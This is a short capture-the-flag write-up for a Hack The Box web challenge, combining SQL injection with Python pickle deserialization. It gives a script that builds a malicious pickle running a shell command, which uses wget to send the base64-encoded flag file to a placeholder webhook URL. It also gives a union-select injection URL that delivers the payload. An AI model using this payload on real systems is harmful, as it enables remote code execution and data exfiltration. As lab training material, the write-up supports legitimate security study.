## **HTB** 
### **Difficult:** easy
### **Type:** SQL injection, Pickle deserialization
___
### **Description:**
The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!

Author: InfoSecJack
___

de.py
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('wget <WEB_HOOK_URL>?$(cat flag.txt | base64)')
        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```
Get flag:

```
http://<HTB_IP>/view/' union select all '<pickle payload>'--
```
